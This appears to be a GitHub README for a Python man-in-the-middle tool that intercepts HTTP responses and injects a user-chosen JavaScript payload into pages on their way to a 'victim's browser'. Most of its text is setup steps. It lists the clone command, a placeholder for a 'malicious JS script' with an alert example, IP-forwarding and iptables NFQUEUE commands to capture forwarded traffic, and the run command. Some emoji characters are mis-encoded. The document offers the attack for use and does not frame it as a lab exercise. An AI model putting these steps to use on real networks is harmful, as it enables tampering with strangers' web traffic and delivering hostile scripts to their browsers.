## ðŸš© Code Injector 

This Python tool intercepts HTTP traffic and **injects custom JavaScript code** into HTML pages in transit.  
It works by modifying HTTP responses on the fly and inserting your payload before they reach the victimâ€™s browser.

## ðŸ›  Installation

1. Clone the repository:
```bash
git clone https://github.com/Nozarashi-1/code-injector.git
cd code-injector
```
---

## ðŸš€ Usage
1. Edit the payload
In the script, find:

       injection_code = 'YOUR MALICIOUS JS SCRIPT>'

Replace it with your JavaScript payload, for example:   

    injection_code = '<script>alert("Hacked!")</script>'

2. Enable IP forwarding

        echo 1 > /proc/sys/net/ipv4/ip_forward

3. Set up iptables to redirect HTTP traffic
For traffic forwarding (man-in-the-middle):

       sudo iptables -I FORWARD -j NFQUEUE --queue-num 0

4. Run the script

        sudo python code_injector.py

5. Flush rules after finishing

        sudo iptables --flush
